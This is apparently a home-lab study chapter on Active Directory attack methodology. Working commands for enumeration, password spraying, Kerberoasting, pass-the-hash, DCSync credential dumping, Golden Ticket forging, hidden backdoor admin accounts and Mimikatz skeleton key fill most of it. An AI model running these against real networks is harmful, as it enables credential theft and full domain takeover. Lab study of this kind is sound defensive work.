# 06 — Active Directory Attacks: Overview and Methodology

## The Attacker's Mindset in AD

Real-world AD attacks follow a structured path, not random exploitation.
The goal is always the same: **Domain Admin** (or equivalent).
The path varies based on what vulnerabilities and misconfigurations exist.

```
External Access
      ↓
Initial Foothold (phishing, VPN vuln, public-facing service)
      ↓
Local Enumeration (who am I? what's around me?)
      ↓
Domain Enumeration (BloodHound, LDAP queries)
      ↓
Privilege Escalation (Kerberoasting, AS-REP, ACL abuse)
      ↓
Lateral Movement (Pass-the-Hash, Pass-the-Ticket, WMI, PSExec)
      ↓
Domain Dominance (DCSync, Golden Ticket, NTDS.dit)
      ↓
Persistence (backdoor accounts, GPO, skeleton key)
```

---

## Phase 1: Enumeration — Know Before You Attack

**You cannot attack what you don't know exists.**
Enumeration is 60% of the work in AD pentesting.

### BloodHound — Graph-Based AD Mapping

BloodHound collects AD data and visualizes attack paths as a graph.
It answers: "What's the shortest path from current user to Domain Admin?"

```bash
# On Kali: start Neo4j database (BloodHound's backend)
sudo neo4j start

# Launch BloodHound
bloodhound &

# Collect data with SharpHound (runs on Windows target)
.\SharpHound.exe -c All

# Or collect remotely with BloodHound.py (from Kali)
python3 bloodhound.py -u alice -p Password1 \
  -d homelab.local -dc dc.homelab.local -c All

# Import the generated .zip into BloodHound GUI
# Run pre-built queries:
# "Find all Domain Admins"
# "Shortest path to Domain Admin"
# "Find AS-REP Roastable users"
# "Find Kerberoastable users"
```

### Manual LDAP Enumeration

```bash
# Enumerate all users
ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
  -D "alice@homelab.local" -w Password1 \
  "(objectClass=user)" sAMAccountName description

# Enumerate Domain Admins
ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
  -D "alice@homelab.local" -w Password1 \
  "(memberOf=CN=Domain Admins,CN=Users,DC=homelab,DC=local)"

# Find service accounts with SPNs (Kerberoastable)
ldapsearch -H ldap://10.20.20.10 -x -b "DC=homelab,DC=local" \
  -D "alice@homelab.local" -w Password1 \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

### CrackMapExec — Swiss Army Knife

```bash
# Enumerate SMB hosts
crackmapexec smb 10.20.20.0/24

# Enumerate shares
crackmapexec smb 10.20.20.10 -u alice -p Password1 --shares

# Enumerate users
crackmapexec smb 10.20.20.10 -u alice -p Password1 --users

# Password spraying (test one password against all users)
crackmapexec smb 10.20.20.10 -u users.txt -p Password1 \
  --continue-on-success
```

### PowerView — AD Enumeration from Windows

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get all users
Get-DomainUser | select samaccountname, description

# Get all computers
Get-DomainComputer | select name, operatingsystem

# Find Domain Admins
Get-DomainGroupMember "Domain Admins"

# Find machines where Domain Admins are logged in
Find-DomainUserLocation -GroupName "Domain Admins"

# Find Kerberoastable accounts
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Find AS-REP Roastable accounts
Get-DomainUser -PreauthNotRequired
```

---

## Phase 2: Initial Access — Getting a Foothold

In our Phase 4 lab, we start from inside the network (Kali on the
same segment). In real engagements, initial access is typically via:
- Phishing email with malicious attachment
- Vulnerable public-facing service (VPN, Exchange, web app)
- Password spraying (valid credentials from OSINT)
- Physical access

---

## Phase 3: Credential Attacks

### Password Spraying
Try one password against many users. Avoids lockout.

```bash
# Test "Password1" against all users (slow = avoid lockout)
crackmapexec smb 10.20.20.10 -u users.txt -p Password1 \
  --continue-on-success

# Common weak passwords to try
Password1, Summer2024!, Winter2024!, Company2024!, Welcome1
```

**Why it works:** Many organizations have users who never changed from
the initial "Welcome1" or seasonal passwords.

### Kerberoasting (revisited)
```bash
# Get all Kerberoastable hashes
python3 GetUserSPNs.py homelab.local/alice:Password1 \
  -dc-ip 10.20.20.10 -request -outputfile kerberoast.txt

# Crack hashes
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  --force -r /usr/share/hashcat/rules/best64.rule
```

### AS-REP Roasting (revisited)
```bash
# Without valid credentials (if guest access enabled)
python3 GetNPUsers.py homelab.local/ -dc-ip 10.20.20.10 \
  -usersfile users.txt -no-pass

# With valid credentials
python3 GetNPUsers.py homelab.local/alice:Password1 \
  -dc-ip 10.20.20.10 -request

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 4: Lateral Movement

Once we have credentials, we move between machines.

### Pass-the-Hash (PtH)
Use NTLM hash without cracking it.

```bash
# SMB lateral movement with hash
crackmapexec smb 10.20.20.11 -u Administrator \
  -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE'

# Execute commands
crackmapexec smb 10.20.20.11 -u Administrator \
  -H 'HASH' -x whoami

# Get shell via PsExec with hash
python3 psexec.py -hashes 'LM:NTLM' administrator@10.20.20.11
```

**Why it works:** NTLM authentication accepts the hash directly.
No need to crack it — just replay it.

### WMI Execution
```bash
# Execute command via WMI
python3 wmiexec.py administrator:Password1@10.20.20.11 whoami

# Or with hash
python3 wmiexec.py -hashes :NTLM_HASH administrator@10.20.20.11
```

### SMBExec
```bash
python3 smbexec.py administrator:Password1@10.20.20.11
```

### WinRM (Port 5985)
```bash
# PowerShell remoting
evil-winrm -i 10.20.20.11 -u administrator -p Password1

# Or with hash
evil-winrm -i 10.20.20.11 -u administrator -H NTLM_HASH
```

---

## Phase 5: Privilege Escalation in AD

### Token Impersonation (Windows)
After gaining a shell, steal tokens of logged-in privileged users:
```bash
# In Meterpreter
use incognito
list_tokens -u
impersonate_token "HOMELAB\\Administrator"
```

### ACL/ACE Abuse
AD objects have Access Control Lists. Misconfigured ACLs can allow
low-privilege users to modify high-privilege objects.

Common exploitable ACLs:
- **GenericAll** on user → change their password
- **GenericWrite** on user → set SPN (make Kerberoastable)
- **WriteDACL** on domain → grant DCSync rights to self
- **ForceChangePassword** on user → reset without knowing current

```powershell
# Find ACL misconfigurations (BloodHound does this visually)
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | 
  Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"}
```

### GPO Abuse
If a user has write access to a GPO, they can execute code on all
machines where that GPO applies.

```bash
# Find GPOs the current user can modify
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | 
  Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser alice).objectsid}
```

---

## Phase 6: Domain Dominance

### DCSync — Extract All Hashes Remotely
```bash
# Requires Replication rights (Domain Admin or delegated)
python3 secretsdump.py homelab.local/Administrator:Password1@10.20.20.10

# Output includes:
# Administrator:500:LM_HASH:NTLM_HASH:::
# krbtgt:502:LM_HASH:NTLM_HASH:::
# alice:1104:LM_HASH:NTLM_HASH:::
```

### NTDS.dit Extraction (Offline)
```bash
# Create VSS shadow copy of C: drive
wmic shadowcopy call create Volume='C:\'

# Copy NTDS.dit (locked during normal operation)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# On Kali: extract hashes
python3 secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Golden Ticket (persistent access)
```bash
# After getting krbtgt hash from DCSync
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX \
  -domain homelab.local FakeAdmin

# Use the ticket
export KRB5CCNAME=FakeAdmin.ccache
python3 psexec.py -k -no-pass homelab.local/FakeAdmin@dc.homelab.local
```

---

## Phase 7: Persistence

### Backdoor Account
```powershell
# Create hidden admin account
net user backdoor Password1 /add
net localgroup administrators backdoor /add
net group "Domain Admins" backdoor /add

# Hide it
Set-ADUser backdoor -Replace @{adminCount=1}
```

### Skeleton Key (Mimikatz)
Patches LSASS to accept a master password for all accounts:
```bash
# Domain Admin required
privilege::debug
misc::skeleton
# Now any account accepts "mimikatz" as password
# Real passwords still work too
```

### GPO Persistence
Modify a GPO to run a payload on domain computers/users logon.

---

## Tools Summary for Phase 4

| Tool | Purpose | Platform |
|---|---|---|
| BloodHound | AD graph mapping, attack path finding | Kali (GUI) |
| SharpHound | BloodHound data collection | Windows (target) |
| Impacket | AD protocol exploitation suite | Kali (Python) |
| CrackMapExec | SMB enumeration and lateral movement | Kali |
| Rubeus | Kerberos ticket manipulation | Windows |
| Mimikatz | Credential extraction from memory | Windows |
| Evil-WinRM | WinRM shell | Kali |
| Hashcat | Offline password cracking | Kali |
| PowerView | AD enumeration via PowerShell | Windows |

### Installing Tools on Kali
```bash
# Impacket (usually pre-installed)
pip3 install impacket

# BloodHound
sudo apt install bloodhound neo4j

# CrackMapExec
sudo apt install crackmapexec

# Evil-WinRM
sudo gem install evil-winrm
```

---

## Our Phase 4 Attack Plan

Given our lab setup (Windows Server 2025 DC + Windows 11 client):

```
Step 1: Network discovery
  nmap -sV 10.20.20.0/24

Step 2: Enumerate AD
  bloodhound-python / ldapsearch / crackmapexec

Step 3: Find attack paths
  BloodHound GUI → "Shortest path to Domain Admin"

Step 4: Kerberoasting
  GetUserSPNs.py → hashcat → crack service account

Step 5: Lateral movement
  CrackMapExec / psexec.py with gained credentials

Step 6: Domain compromise
  Secretsdump / DCSync → get all hashes

Step 7: Golden Ticket
  ticketer.py → persistent DA access

Step 8: Document everything
  Screenshots + .md files for each attack
```

---

## Key Takeaways

- AD attacks are methodical, not random: enumerate first, attack second
- BloodHound is the most important tool — it shows attack paths visually
- Password spraying and Kerberoasting are low-noise first steps
  (no account lockout, no failed auth logs for Kerberoasting)
- Pass-the-Hash works because NTLM accepts hashes directly
- DCSync is the endgame: Domain Admin → all hashes → game over
- Golden Ticket = persistent access that survives admin password changes
- Defense in depth: MFA, Privileged Access Workstations, Protected Users
  group, LAPS, SMB signing — all make these attacks harder
